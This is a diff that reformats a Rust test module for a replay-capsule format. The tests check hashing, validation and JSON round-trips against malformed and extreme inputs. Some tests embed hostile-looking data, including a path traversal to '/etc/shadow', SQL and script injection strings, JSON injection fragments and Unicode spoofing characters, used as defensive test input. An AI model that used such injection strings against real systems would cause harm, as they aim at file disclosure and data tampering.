@@ -885,12 +885,28 @@ mod tests {
 
         // Hash collision attempt: different sequence orders with same data
         let inputs_order1 = vec![
-            CapsuleInput { seq: 1, data: b"a".to_vec(), metadata: BTreeMap::new() },
-            CapsuleInput { seq: 2, data: b"b".to_vec(), metadata: BTreeMap::new() },
+            CapsuleInput {
+                seq: 1,
+                data: b"a".to_vec(),
+                metadata: BTreeMap::new(),
+            },
+            CapsuleInput {
+                seq: 2,
+                data: b"b".to_vec(),
+                metadata: BTreeMap::new(),
+            },
         ];
         let inputs_order2 = vec![
-            CapsuleInput { seq: 2, data: b"a".to_vec(), metadata: BTreeMap::new() },
-            CapsuleInput { seq: 1, data: b"b".to_vec(), metadata: BTreeMap::new() },
+            CapsuleInput {
+                seq: 2,
+                data: b"a".to_vec(),
+                metadata: BTreeMap::new(),
+            },
+            CapsuleInput {
+                seq: 1,
+                data: b"b".to_vec(),
+                metadata: BTreeMap::new(),
+            },
         ];
         let hash1 = compute_inputs_hash(&inputs_order1);
         let hash2 = compute_inputs_hash(&inputs_order2);
@@ -1005,7 +1021,10 @@ mod tests {
             output_hash: String::new(),
         }];
         assert!(!expected_outputs_match_hash(&outputs_empty_hash, ""));
-        assert!(!expected_outputs_match_hash(&outputs_empty_hash, "non_empty"));
+        assert!(!expected_outputs_match_hash(
+            &outputs_empty_hash,
+            "non_empty"
+        ));
 
         // Very long hash strings (DoS protection)
         let long_hash = "a".repeat(100_000);
@@ -1179,20 +1198,43 @@ mod tests {
 
         // Inputs with gaps in sequence numbers (should still be monotonic)
         let gapped_inputs = vec![
-            CapsuleInput { seq: 5, data: b"a".to_vec(), metadata: BTreeMap::new() },
-            CapsuleInput { seq: 10, data: b"b".to_vec(), metadata: BTreeMap::new() },
-            CapsuleInput { seq: 20, data: b"c".to_vec(), metadata: BTreeMap::new() },
+            CapsuleInput {
+                seq: 5,
+                data: b"a".to_vec(),
+                metadata: BTreeMap::new(),
+            },
+            CapsuleInput {
+                seq: 10,
+                data: b"b".to_vec(),
+                metadata: BTreeMap::new(),
+            },
+            CapsuleInput {
+                seq: 20,
+                data: b"c".to_vec(),
+                metadata: BTreeMap::new(),
+            },
         ];
         let result_gapped = create_capsule("gapped", gapped_inputs, test_env());
         assert!(result_gapped.is_ok());
 
         // Inputs with duplicate sequence numbers (should fail)
         let duplicate_inputs = vec![
-            CapsuleInput { seq: 1, data: b"a".to_vec(), metadata: BTreeMap::new() },
-            CapsuleInput { seq: 1, data: b"b".to_vec(), metadata: BTreeMap::new() },
+            CapsuleInput {
+                seq: 1,
+                data: b"a".to_vec(),
+                metadata: BTreeMap::new(),
+            },
+            CapsuleInput {
+                seq: 1,
+                data: b"b".to_vec(),
+                metadata: BTreeMap::new(),
+            },
         ];
         let result_dup = create_capsule("dup", duplicate_inputs, test_env());
-        assert!(matches!(result_dup.unwrap_err(), CapsuleError::NonMonotonicInputSequence));
+        assert!(matches!(
+            result_dup.unwrap_err(),
+            CapsuleError::NonMonotonicInputSequence
+        ));
 
         // Inputs with very large metadata maps
         let mut huge_metadata = BTreeMap::new();
@@ -1237,8 +1279,16 @@ mod tests {
             capsule_id: "max_seq".to_string(),
             format_version: CURRENT_FORMAT_VERSION,
             inputs: vec![
-                CapsuleInput { seq: u64::MAX - 1, data: b"a".to_vec(), metadata: BTreeMap::new() },
-                CapsuleInput { seq: u64::MAX, data: b"b".to_vec(), metadata: BTreeMap::new() },
+                CapsuleInput {
+                    seq: u64::MAX - 1,
+                    data: b"a".to_vec(),
+                    metadata: BTreeMap::new(),
+                },
+                CapsuleInput {
+                    seq: u64::MAX,
+                    data: b"b".to_vec(),
+                    metadata: BTreeMap::new(),
+                },
             ],
             expected_outputs: vec![CapsuleOutput {
                 seq: 0,
@@ -1305,13 +1355,13 @@ mod tests {
     fn test_serialization_negative_paths() {
         // Malformed JSON strings
         let bad_jsons = vec![
-            "",                     // Empty string
-            "{",                   // Unclosed brace
-            "null",                // Wrong type
-            "[]",                  // Wrong type (array)
-            "123",                 // Wrong type (number)
-            "\"string\"",          // Wrong type (string)
-            "{\"incomplete\":",    // Incomplete object
+            "",                      // Empty string
+            "{",                     // Unclosed brace
+            "null",                  // Wrong type
+            "[]",                    // Wrong type (array)
+            "123",                   // Wrong type (number)
+            "\"string\"",            // Wrong type (string)
+            "{\"incomplete\":",      // Incomplete object
             "{\"capsule_id\": 123}", // Wrong field type
         ];
 
@@ -1322,25 +1372,31 @@ mod tests {
 
         // JSON with missing required fields
         let incomplete_jsons = vec![
-            "{}",  // Completely empty object
-            "{\"capsule_id\": \"test\"}", // Missing other required fields
+            "{}",                                                // Completely empty object
+            "{\"capsule_id\": \"test\"}",                        // Missing other required fields
             "{\"capsule_id\": \"test\", \"format_version\": 1}", // Missing inputs, outputs, environment
         ];
 
         for incomplete_json in incomplete_jsons {
             let result = from_json(incomplete_json);
-            assert!(result.is_err(), "Should fail incomplete JSON: {}", incomplete_json);
+            assert!(
+                result.is_err(),
+                "Should fail incomplete JSON: {}",
+                incomplete_json
+            );
         }
 
         // Very large JSON (DoS protection)
         let large_cap = ReplayCapsule {
             capsule_id: "x".repeat(100_000),
             format_version: CURRENT_FORMAT_VERSION,
-            inputs: (0..1000).map(|i| CapsuleInput {
-                seq: i,
-                data: vec![0u8; 1000], // 1KB per input
-                metadata: BTreeMap::new(),
-            }).collect(),
+            inputs: (0..1000)
+                .map(|i| CapsuleInput {
+                    seq: i,
+                    data: vec![0u8; 1000], // 1KB per input
+                    metadata: BTreeMap::new(),
+                })
+                .collect(),
             expected_outputs: vec![CapsuleOutput {
                 seq: 0,
                 data: vec![0u8; 10000],
@@ -1692,9 +1748,15 @@ mod tests {
     fn test_metadata_injection_resistance() {
         let mut malicious_metadata = BTreeMap::new();
         malicious_metadata.insert("key\x00null".to_string(), "value\x00null".to_string());
-        malicious_metadata.insert("../../config".to_string(), "../../../etc/shadow".to_string());
+        malicious_metadata.insert(
+            "../../config".to_string(),
+            "../../../etc/shadow".to_string(),
+        );
         malicious_metadata.insert("<script>".to_string(), "'; DROP DATABASE;".to_string());
-        malicious_metadata.insert("\u{FEFF}bom\u{200B}zero_width".to_string(), "\u{202E}rtl".to_string());
+        malicious_metadata.insert(
+            "\u{FEFF}bom\u{200B}zero_width".to_string(),
+            "\u{202E}rtl".to_string(),
+        );
 
         let inputs = vec![CapsuleInput {
             seq: 0,
@@ -1750,8 +1812,12 @@ mod tests {
         env.platform = "linux\x1b[31mred\x1b[0m".to_string();
         env.config_hash = "\u{200B}\u{FEFF}invisible\u{202E}rtl".to_string();
 
-        env.properties.insert("\x00key\r\n".to_string(), "\x08\x7Fvalue".to_string());
-        env.properties.insert("unicode\u{1F4A9}".to_string(), "\u{202E}backwards".to_string());
+        env.properties
+            .insert("\x00key\r\n".to_string(), "\x08\x7Fvalue".to_string());
+        env.properties.insert(
+            "unicode\u{1F4A9}".to_string(),
+            "\u{202E}backwards".to_string(),
+        );
 
         let result = create_capsule("control-char-env", test_inputs(), env.clone());
         assert!(result.is_ok());
@@ -1826,18 +1892,14 @@ mod tests {
     #[test]
     fn test_arithmetic_overflow_in_hash_computation() {
         // Create inputs that could trigger overflow in length calculations
-        let inputs = vec![
-            CapsuleInput {
-                seq: 0,
-                data: vec![0xFF; usize::MAX / 1024], // Large but not impossible
-                metadata: BTreeMap::new(),
-            },
-        ];
+        let inputs = vec![CapsuleInput {
+            seq: 0,
+            data: vec![0xFF; usize::MAX / 1024], // Large but not impossible
+            metadata: BTreeMap::new(),
+        }];
 
         // Test should not panic even with extreme input sizes
-        let huge_input_result = std::panic::catch_unwind(|| {
-            compute_inputs_hash(&inputs)
-        });
+        let huge_input_result = std::panic::catch_unwind(|| compute_inputs_hash(&inputs));
 
         // Either completes successfully or panics gracefully
         assert!(huge_input_result.is_ok() || huge_input_result.is_err());
@@ -1851,9 +1913,7 @@ mod tests {
             })
             .collect();
 
-        let hash_result = std::panic::catch_unwind(|| {
-            compute_inputs_hash(&many_inputs)
-        });
+        let hash_result = std::panic::catch_unwind(|| compute_inputs_hash(&many_inputs));
 
         assert!(hash_result.is_ok() || hash_result.is_err());
     }
@@ -1868,11 +1928,11 @@ mod tests {
         }];
 
         let boundary_versions = [
-            0u32,                    // Below minimum
-            1u32,                    // Current minimum
-            CURRENT_FORMAT_VERSION,  // Current version
-            u32::MAX - 1,            // Near maximum
-            u32::MAX,                // Maximum u32
+            0u32,                   // Below minimum
+            1u32,                   // Current minimum
+            CURRENT_FORMAT_VERSION, // Current version
+            u32::MAX - 1,           // Near maximum
+            u32::MAX,               // Maximum u32
         ];
 
         for &version in &boundary_versions {
@@ -1885,11 +1945,17 @@ mod tests {
             let validation_result = validate_capsule(&capsule);
 
             if version >= MIN_FORMAT_VERSION && version <= CURRENT_FORMAT_VERSION {
-                assert!(validation_result.is_ok(),
-                       "Version {} should be valid", version);
+                assert!(
+                    validation_result.is_ok(),
+                    "Version {} should be valid",
+                    version
+                );
             } else {
-                assert!(validation_result.is_err(),
-                       "Version {} should be invalid", version);
+                assert!(
+                    validation_result.is_err(),
+                    "Version {} should be invalid",
+                    version
+                );
 
                 match validation_result.unwrap_err() {
                     CapsuleError::UnsupportedVersion(v) => {
@@ -1901,7 +1967,11 @@ mod tests {
 
             // JSON serialization should handle any version value
             let json_result = to_canonical_json(&capsule);
-            assert!(json_result.is_ok(), "JSON serialization should handle version {}", version);
+            assert!(
+                json_result.is_ok(),
+                "JSON serialization should handle version {}",
+                version
+            );
 
             // Test JSON round-trip preserves version exactly
             if let Ok(json) = json_result {
@@ -1937,41 +2007,62 @@ mod tests {
         let creation_duration = start_time.elapsed();
 
         // Should complete in reasonable time despite massive environment
-        assert!(creation_duration < std::time::Duration::from_secs(30),
-               "Massive environment creation took too long: {:?}", creation_duration);
+        assert!(
+            creation_duration < std::time::Duration::from_secs(30),
+            "Massive environment creation took too long: {:?}",
+            creation_duration
+        );
 
         match result {
             Ok(capsule) => {
                 // Environment should be preserved exactly
-                assert_eq!(capsule.environment.properties.len(), massive_env.properties.len());
+                assert_eq!(
+                    capsule.environment.properties.len(),
+                    massive_env.properties.len()
+                );
 
                 // Validation should handle massive environment
                 let validation_start = std::time::Instant::now();
                 let validation_result = validate_capsule(&capsule);
                 let validation_duration = validation_start.elapsed();
 
-                assert!(validation_duration < std::time::Duration::from_secs(10),
-                       "Massive environment validation took too long: {:?}", validation_duration);
-                assert!(validation_result.is_ok(), "Massive environment should validate");
+                assert!(
+                    validation_duration < std::time::Duration::from_secs(10),
+                    "Massive environment validation took too long: {:?}",
+                    validation_duration
+                );
+                assert!(
+                    validation_result.is_ok(),
+                    "Massive environment should validate"
+                );
 
                 // JSON serialization should handle massive data
                 let json_start = std::time::Instant::now();
                 let json_result = to_canonical_json(&capsule);
                 let json_duration = json_start.elapsed();
 
-                assert!(json_duration < std::time::Duration::from_secs(60),
-                       "Massive environment JSON serialization took too long: {:?}", json_duration);
+                assert!(
+                    json_duration < std::time::Duration::from_secs(60),
+                    "Massive environment JSON serialization took too long: {:?}",
+                    json_duration
+                );
 
                 if let Ok(json) = json_result {
                     // Should produce substantial JSON (>1MB)
-                    assert!(json.len() > 1_000_000,
-                           "Massive environment should produce substantial JSON: {} bytes", json.len());
+                    assert!(
+                        json.len() > 1_000_000,
+                        "Massive environment should produce substantial JSON: {} bytes",
+                        json.len()
+                    );
 
                     // Limited deserialization test (could be slow)
-                    if json.len() < 10_000_000 { // Only test if <10MB
+                    if json.len() < 10_000_000 {
+                        // Only test if <10MB
                         let parse_result = from_json(&json);
-                        assert!(parse_result.is_ok() || parse_result.is_err(),
-                               "Deserialization should complete without panic");
+                        assert!(
+                            parse_result.is_ok() || parse_result.is_err(),
+                            "Deserialization should complete without panic"
+                        );
                     }
                 }
             }
@@ -1991,21 +2082,18 @@ mod tests {
                 data: "café\u{0301}\u{FEFF}\u{200B}".as_bytes().to_vec(), // Combined chars + BOM + zero-width
                 metadata: BTreeMap::new(),
             },
-
             // Control characters in data
             CapsuleInput {
                 seq: 2,
                 data: b"\x00\x01\x02\x03\x1B[31mRED\x1B[0m\x7F\x80".to_vec(),
                 metadata: BTreeMap::new(),
             },
-
             // Large Unicode codepoints in data
             CapsuleInput {
                 seq: 3,
                 data: "🚀🎯🔥💻⚡🌟🎨🔧🚦🎪\u{10FFFF}".as_bytes().to_vec(),
                 metadata: BTreeMap::new(),
             },
-
             // Unicode and control chars in metadata
             CapsuleInput {
                 seq: 4,
@@ -2020,7 +2108,11 @@ mod tests {
             },
         ];
 
-        let result = create_capsule("unicode_control_test", problematic_inputs.clone(), test_env());
+        let result = create_capsule(
+            "unicode_control_test",
+            problematic_inputs.clone(),
+            test_env(),
+        );
 
         match result {
             Ok(capsule) => {
@@ -2029,15 +2121,22 @@ mod tests {
 
                 for (original, preserved) in problematic_inputs.iter().zip(capsule.inputs.iter()) {
                     assert_eq!(original.seq, preserved.seq);
-                    assert_eq!(original.data, preserved.data, "Data should be preserved exactly");
-                    assert_eq!(original.metadata, preserved.metadata, "Metadata should be preserved exactly");
+                    assert_eq!(
+                        original.data, preserved.data,
+                        "Data should be preserved exactly"
+                    );
+                    assert_eq!(
+                        original.metadata, preserved.metadata,
+                        "Metadata should be preserved exactly"
+                    );
                 }
 
                 // Validation should handle Unicode/control chars
                 assert!(validate_capsule(&capsule).is_ok());
 
                 // JSON round-trip should preserve all characters
-                let json = to_canonical_json(&capsule).expect("should serialize Unicode/control chars");
+                let json =
+                    to_canonical_json(&capsule).expect("should serialize Unicode/control chars");
                 let parsed = from_json(&json).expect("should deserialize Unicode/control chars");
                 assert_eq!(parsed.inputs.len(), capsule.inputs.len());
 
@@ -2060,16 +2159,12 @@ mod tests {
             r#"","malicious":"payload","hijacked":"#,
             r#"}],"injected":true,"real":"#,
             r#"null}/*comment*/{"evil":"#,
-
             // Unicode escape injection
             "\u{0022}\u{003A}\u{007B}\u{0022}injected\u{0022}",
-
             // Control character injection
             "\x00\x01\x02\":{\"evil\":true}//\x03\x04",
-
             // Large payload injection
             &"\\".repeat(100000),
-
             // Number-like strings
             "1.7976931348623157e+308",
             "-0",
@@ -2097,13 +2192,16 @@ mod tests {
             match result {
                 Ok(capsule) => {
                     // JSON serialization should safely escape injection attempts
-                    let json = to_canonical_json(&capsule).expect("should serialize injection payload");
+                    let json =
+                        to_canonical_json(&capsule).expect("should serialize injection payload");
 
                     // JSON should not contain unescaped injection content
                     if payload.contains('"') || payload.contains('{') || payload.contains('}') {
                         // Dangerous characters should be properly escaped
-                        assert!(!json.contains(&payload.replace('\\', "")),
-                               "Dangerous payload should be escaped in JSON");
+                        assert!(
+                            !json.contains(&payload.replace('\\', "")),
+                            "Dangerous payload should be escaped in JSON"
+                        );
                     }
 
                     // Deserialization should recover exact payload without interpretation
@@ -2144,7 +2242,7 @@ mod tests {
                         for j in 0..(capsule_idx % 5) {
                             meta.insert(
                                 format!("meta_{}_{}", capsule_idx, j),
-                                format!("value_{}", "x".repeat(capsule_idx % 50))
+                                format!("value_{}", "x".repeat(capsule_idx % 50)),
                             );
                         }
                         meta
@@ -2157,9 +2255,12 @@ mod tests {
             let duration = start.elapsed();
 
             // Should complete quickly despite memory fragmentation
-            assert!(duration < std::time::Duration::from_millis(500),
-                   "Capsule {} creation under memory pressure took too long: {:?}",
-                   capsule_idx, duration);
+            assert!(
+                duration < std::time::Duration::from_millis(500),
+                "Capsule {} creation under memory pressure took too long: {:?}",
+                capsule_idx,
+                duration
+            );
 
             match result {
                 Ok(capsule) => {
@@ -2179,8 +2280,10 @@ mod tests {
             }
         }
 
-        assert!(created_capsules.len() >= 50,
-               "Should create substantial number of capsules despite memory pressure");
+        assert!(
+            created_capsules.len() >= 50,
+            "Should create substantial number of capsules despite memory pressure"
+        );
 
         // Validation under memory pressure
         for (i, capsule) in created_capsules.iter().enumerate() {
@@ -2188,18 +2291,32 @@ mod tests {
             let validation = validate_capsule(capsule);
             let val_duration = val_start.elapsed();
 
-            assert!(val_duration < std::time::Duration::from_millis(100),
-                   "Validation {} under memory pressure took too long: {:?}",
-                   i, val_duration);
-            assert!(validation.is_ok(), "Capsule {} should validate under memory pressure", i);
+            assert!(
+                val_duration < std::time::Duration::from_millis(100),
+                "Validation {} under memory pressure took too long: {:?}",
+                i,
+                val_duration
+            );
+            assert!(
+                validation.is_ok(),
+                "Capsule {} should validate under memory pressure",
+                i
+            );
         }
 
         // Memory cleanup should not affect operations
         drop(fragmenters);
 
-        let post_cleanup_capsule = create_capsule("post_cleanup",
-            vec![CapsuleInput { seq: 1, data: b"cleanup_test".to_vec(), metadata: BTreeMap::new() }],
-            test_env()).expect("should create after cleanup");
+        let post_cleanup_capsule = create_capsule(
+            "post_cleanup",
+            vec![CapsuleInput {
+                seq: 1,
+                data: b"cleanup_test".to_vec(),
+                metadata: BTreeMap::new(),
+            }],
+            test_env(),
+        )
+        .expect("should create after cleanup");
 
         assert!(validate_capsule(&post_cleanup_capsule).is_ok());
     }
@@ -2209,49 +2326,95 @@ mod tests {
         // Test hash computation with various malformed and extreme data patterns
         let extreme_inputs = vec![
             // Empty data
-            vec![CapsuleInput { seq: 0, data: vec![], metadata: BTreeMap::new() }],
-
+            vec![CapsuleInput {
+                seq: 0,
+                data: vec![],
+                metadata: BTreeMap::new(),
+            }],
             // Single byte patterns
-            vec![CapsuleInput { seq: 1, data: vec![0x00], metadata: BTreeMap::new() }],
-            vec![CapsuleInput { seq: 2, data: vec![0xFF], metadata: BTreeMap::new() }],
-
+            vec![CapsuleInput {
+                seq: 1,
+                data: vec![0x00],
+                metadata: BTreeMap::new(),
+            }],
+            vec![CapsuleInput {
+                seq: 2,
+                data: vec![0xFF],
+                metadata: BTreeMap::new(),
+            }],
             // Repeating patterns that might confuse hash algorithms
-            vec![CapsuleInput { seq: 3, data: vec![0xAA; 1000000], metadata: BTreeMap::new() }],
-            vec![CapsuleInput { seq: 4, data: vec![0x55; 1000000], metadata: BTreeMap::new() }],
-            vec![CapsuleInput { seq: 5, data: (0u8..=255u8).cycle().take(1000000).collect(), metadata: BTreeMap::new() }],
-
+            vec![CapsuleInput {
+                seq: 3,
+                data: vec![0xAA; 1000000],
+                metadata: BTreeMap::new(),
+            }],
+            vec![CapsuleInput {
+                seq: 4,
+                data: vec![0x55; 1000000],
+                metadata: BTreeMap::new(),
+            }],
+            vec![CapsuleInput {
+                seq: 5,
+                data: (0u8..=255u8).cycle().take(1000000).collect(),
+                metadata: BTreeMap::new(),
+            }],
             // Binary data with potential hash collision patterns
-            vec![CapsuleInput { seq: 6, data: b"abc".to_vec(), metadata: BTreeMap::new() }],
-            vec![CapsuleInput { seq: 7, data: b"acb".to_vec(), metadata: BTreeMap::new() }],
-            vec![CapsuleInput { seq: 8, data: b"bac".to_vec(), metadata: BTreeMap::new() }],
-
+            vec![CapsuleInput {
+                seq: 6,
+                data: b"abc".to_vec(),
+                metadata: BTreeMap::new(),
+            }],
+            vec![CapsuleInput {
+                seq: 7,
+                data: b"acb".to_vec(),
+                metadata: BTreeMap::new(),
+            }],
+            vec![CapsuleInput {
+                seq: 8,
+                data: b"bac".to_vec(),
+                metadata: BTreeMap::new(),
+            }],
             // Very large single input
-            vec![CapsuleInput { seq: 9, data: vec![0x42; 10_000_000], metadata: BTreeMap::new() }],
+            vec![CapsuleInput {
+                seq: 9,
+                data: vec![0x42; 10_000_000],
+                metadata: BTreeMap::new(),
+            }],
         ];
 
         let mut all_hashes = Vec::new();
 
         for (test_idx, inputs) in extreme_inputs.iter().enumerate() {
             let hash_start = std::time::Instant::now();
-            let hash_result = std::panic::catch_unwind(|| {
-                compute_inputs_hash(inputs)
-            });
+            let hash_result = std::panic::catch_unwind(|| compute_inputs_hash(inputs));
             let hash_duration = hash_start.elapsed();
 
             // Should complete without panic and in reasonable time
-            assert!(hash_result.is_ok(), "Hash computation {} should not panic", test_idx);
+            assert!(
+                hash_result.is_ok(),
+                "Hash computation {} should not panic",
+                test_idx
+            );
 
-            if test_idx < 8 { // Skip timing check for very large input
-                assert!(hash_duration < std::time::Duration::from_secs(5),
-                       "Hash computation {} took too long: {:?}", test_idx, hash_duration);
+            if test_idx < 8 {
+                // Skip timing check for very large input
+                assert!(
+                    hash_duration < std::time::Duration::from_secs(5),
+                    "Hash computation {} took too long: {:?}",
+                    test_idx,
+                    hash_duration
+                );
             }
 
             let hash = hash_result.unwrap();
 
             // Hash should be valid hex string
             assert_eq!(hash.len(), 64, "Hash {} should be 64 chars", test_idx);
-            assert!(hash.chars().all(|c| c.is_ascii_hexdigit()),
-                   "Hash {} should be valid hex", test_idx);
+            assert!(
+                hash.chars().all(|c| c.is_ascii_hexdigit()),
+                "Hash {} should be valid hex",
+                test_idx
+            );
 
             all_hashes.push(hash);
         }
@@ -2259,17 +2422,24 @@ mod tests {
         // All hashes should be unique (no collisions)
         for i in 0..all_hashes.len() {
             for j in (i + 1)..all_hashes.len() {
-                assert_ne!(all_hashes[i], all_hashes[j],
-                          "Hash collision detected between test {} and {}: both produced {}",
-                          i, j, all_hashes[i]);
+                assert_ne!(
+                    all_hashes[i], all_hashes[j],
+                    "Hash collision detected between test {} and {}: both produced {}",
+                    i, j, all_hashes[i]
+                );
             }
         }
 
         // Test hash determinism
-        for (test_idx, inputs) in extreme_inputs.iter().enumerate().take(5) { // Test subset for performance
+        for (test_idx, inputs) in extreme_inputs.iter().enumerate().take(5) {
+            // Test subset for performance
             let hash1 = compute_inputs_hash(inputs);
             let hash2 = compute_inputs_hash(inputs);
-            assert_eq!(hash1, hash2, "Hash computation {} should be deterministic", test_idx);
+            assert_eq!(
+                hash1, hash2,
+                "Hash computation {} should be deterministic",
+                test_idx
+            );
         }
     }
 
@@ -2295,7 +2465,9 @@ mod tests {
                     // Each thread creates unique capsules
                     let inputs = vec![CapsuleInput {
                         seq: operation as u64,
-                        data: format!("thread_{}_op_{}", thread_id, operation).as_bytes().to_vec(),
+                        data: format!("thread_{}_op_{}", thread_id, operation)
+                            .as_bytes()
+                            .to_vec(),
                         metadata: {
                             let mut meta = BTreeMap::new();
                             meta.insert("thread_id".to_string(), thread_id.to_string());
@@ -2310,9 +2482,13 @@ mod tests {
                     let create_result = create_capsule(&capsule_id, inputs, test_env());
                     let create_duration = create_start.elapsed();
 
-                    assert!(create_duration < std::time::Duration::from_millis(200),
-                           "Thread {} operation {} creation took too long: {:?}",
-                           thread_id, operation, create_duration);
+                    assert!(
+                        create_duration < std::time::Duration::from_millis(200),
+                        "Thread {} operation {} creation took too long: {:?}",
+                        thread_id,
+                        operation,
+                        create_duration
+                    );
 
                     match create_result {
                         Ok(capsule) => {
@@ -2322,39 +2498,64 @@ mod tests {
                             assert_eq!(capsule.inputs[0].seq, operation as u64);
 
                             // Validate metadata integrity
-                            let thread_id_meta = capsule.inputs[0].metadata.get("thread_id").unwrap();
-                            let operation_meta = capsule.inputs[0].metadata.get("operation").unwrap();
+                            let thread_id_meta =
+                                capsule.inputs[0].metadata.get("thread_id").unwrap();
+                            let operation_meta =
+                                capsule.inputs[0].metadata.get("operation").unwrap();
                             assert_eq!(thread_id_meta, &thread_id.to_string());
                             assert_eq!(operation_meta, &operation.to_string());
 
                             // Validation should succeed
                             let val_result = validate_capsule(&capsule);
-                            assert!(val_result.is_ok(),
-                                   "Thread {} operation {} validation failed: {:?}",
-                                   thread_id, operation, val_result);
+                            assert!(
+                                val_result.is_ok(),
+                                "Thread {} operation {} validation failed: {:?}",
+                                thread_id,
+                                operation,
+                                val_result
+                            );
 
                             // JSON round-trip should preserve integrity
                             let json = to_canonical_json(&capsule);
-                            assert!(json.is_ok(),
-                                   "Thread {} operation {} JSON serialization failed",
-                                   thread_id, operation);
+                            assert!(
+                                json.is_ok(),
+                                "Thread {} operation {} JSON serialization failed",
+                                thread_id,
+                                operation
+                            );
 
                             if let Ok(json_str) = json {
                                 let parse_result = from_json(&json_str);
-                                assert!(parse_result.is_ok(),
-                                       "Thread {} operation {} JSON parsing failed",
-                                       thread_id, operation);
+                                assert!(
+                                    parse_result.is_ok(),
+                                    "Thread {} operation {} JSON parsing failed",
+                                    thread_id,
+                                    operation
+                                );
 
                                 if let Ok(parsed_capsule) = parse_result {
                                     assert_eq!(parsed_capsule.capsule_id, capsule.capsule_id);
-                                    assert_eq!(parsed_capsule.inputs[0].data, capsule.inputs[0].data);
+                                    assert_eq!(
+                                        parsed_capsule.inputs[0].data,
+                                        capsule.inputs[0].data
+                                    );
                                 }
                             }
 
-                            thread_results.push((thread_id, operation, "success", capsule.capsule_id));
+                            thread_results.push((
+                                thread_id,
+                                operation,
+                                "success",
+                                capsule.capsule_id,
+                            ));
                         }
                         Err(e) => {
-                            thread_results.push((thread_id, operation, "error", format!("{:?}", e)));
+                            thread_results.push((
+                                thread_id,
+                                operation,
+                                "error",
+                                format!("{:?}", e),
+                            ));
                         }
                     }
                 }
@@ -2380,21 +2581,27 @@ mod tests {
         assert_eq!(final_results.len(), thread_count * operations_per_thread);
 
         // Count successes
-        let success_count = final_results.iter()
+        let success_count = final_results
+            .iter()
             .filter(|(_, _, status, _)| *status == "success")
             .count();
 
         let success_rate = success_count as f64 / final_results.len() as f64;
-        assert!(success_rate > 0.95,
-               "Success rate too low under concurrent load: {:.2}%", success_rate * 100.0);
+        assert!(
+            success_rate > 0.95,
+            "Success rate too low under concurrent load: {:.2}%",
+            success_rate * 100.0
+        );
 
         // Verify no data corruption - each thread's data should be isolated
         for (thread_id, operation, status, result) in final_results.iter() {
             if *status == "success" {
                 let expected_id = format!("concurrent_{}_{}", thread_id, operation);
-                assert_eq!(*result, expected_id,
-                          "Data corruption detected: thread {} op {} produced wrong ID",
-                          thread_id, operation);
+                assert_eq!(
+                    *result, expected_id,
+                    "Data corruption detected: thread {} op {} produced wrong ID",
+                    thread_id, operation
+                );
             }
         }
     }
@@ -2425,35 +2632,30 @@ mod tests {
                 }
                 corrupted
             },
-
             // Completely different hash
             {
                 let mut corrupted = original_output.clone();
                 corrupted.output_hash = "f".repeat(64);
                 corrupted
             },
-
             // Empty hash
             {
                 let mut corrupted = original_output.clone();
                 corrupted.output_hash = "".to_string();
                 corrupted
             },
-
             // Invalid hex hash
             {
                 let mut corrupted = original_output.clone();
                 corrupted.output_hash = "zzzz".repeat(16);
                 corrupted
             },
-
             // Wrong length hash
             {
                 let mut corrupted = original_output.clone();
                 corrupted.output_hash = "a".repeat(32); // Too short
                 corrupted
             },
-
             // Hash with injection attempt
             {
                 let mut corrupted = original_output.clone();
@@ -2471,8 +2673,11 @@ mod tests {
             match replay_result {
                 Ok(verified) => {
                     // Should detect corruption and return false
-                    assert!(!verified,
-                           "Corruption pattern {} should be detected and fail verification", i);
+                    assert!(
+                        !verified,
+                        "Corruption pattern {} should be detected and fail verification",
+                        i
+                    );
                 }
                 Err(_) => {
                     // Early detection of corruption during replay is also acceptable
@@ -2482,8 +2687,11 @@ mod tests {
             // Validation should still work (structural integrity)
             let validation = validate_capsule(&test_capsule);
             // May pass or fail depending on severity of corruption
-            assert!(validation.is_ok() || validation.is_err(),
-                   "Validation should complete deterministically for corruption pattern {}", i);
+            assert!(
+                validation.is_ok() || validation.is_err(),
+                "Validation should complete deterministically for corruption pattern {}",
+                i
+            );
         }
 
         // Original capsule should still verify correctly
@@ -2495,16 +2703,16 @@ mod tests {
     fn negative_capsule_comprehensive_unicode_injection_and_metadata_attacks() {
         // Test comprehensive Unicode injection and metadata attack resistance
         let malicious_unicode_patterns = [
-            "\u{202E}\u{202D}fake_capsule\u{202C}",       // Right-to-left override
-            "capsule\u{000A}\u{000D}injected\x00nulls",   // CRLF + null injection
-            "\u{FEFF}bom_capsule\u{FFFE}reversed",        // BOM injection attacks
-            "\u{200B}\u{200C}\u{200D}zero_width",         // Zero-width characters
-            "胶囊\u{007F}\u{0001}\u{001F}控制字符",         // Unicode + control chars
-            "\u{FFFF}\u{FFFE}\u{FDD0}non_characters",     // Non-character code points
-            "🎬🔄\u{1F4A5}💥\u{1F52B}🔫",                 // Complex emoji sequences
-            "\u{0300}\u{0301}\u{0302}combining_marks",    // Combining marks
-            format!("../../../{}", "x".repeat(1000)),      // Path traversal + long string
-            "capsule\x00\x01\x02\x03\x04\x05hidden",       // Binary injection
+            "\u{202E}\u{202D}fake_capsule\u{202C}", // Right-to-left override
+            "capsule\u{000A}\u{000D}injected\x00nulls", // CRLF + null injection
+            "\u{FEFF}bom_capsule\u{FFFE}reversed",  // BOM injection attacks
+            "\u{200B}\u{200C}\u{200D}zero_width",   // Zero-width characters
+            "胶囊\u{007F}\u{0001}\u{001F}控制字符", // Unicode + control chars
+            "\u{FFFF}\u{FFFE}\u{FDD0}non_characters", // Non-character code points
+            "🎬🔄\u{1F4A5}💥\u{1F52B}🔫",           // Complex emoji sequences
+            "\u{0300}\u{0301}\u{0302}combining_marks", // Combining marks
+            format!("../../../{}", "x".repeat(1000)), // Path traversal + long string
+            "capsule\x00\x01\x02\x03\x04\x05hidden", // Binary injection
         ];
 
         for (i, pattern) in malicious_unicode_patterns.iter().enumerate() {
@@ -2565,8 +2773,12 @@ mod tests {
 
                             // And deserializable
                             if let Ok(json_str) = serialized {
-                                let deserialized: Result<ReplayCapsule, _> = serde_json::from_str(&json_str);
-                                assert!(deserialized.is_ok(), "Unicode capsule should be deserializable");
+                                let deserialized: Result<ReplayCapsule, _> =
+                                    serde_json::from_str(&json_str);
+                                assert!(
+                                    deserialized.is_ok(),
+                                    "Unicode capsule should be deserializable"
+                                );
 
                                 if let Ok(reconstructed) = deserialized {
                                     assert_eq!(reconstructed.capsule_id, capsule.capsule_id);
@@ -2603,25 +2815,38 @@ mod tests {
             // Extremely long values
             BTreeMap::from([("key".to_string(), "y".repeat(100_000))]),
             // Many small key-value pairs
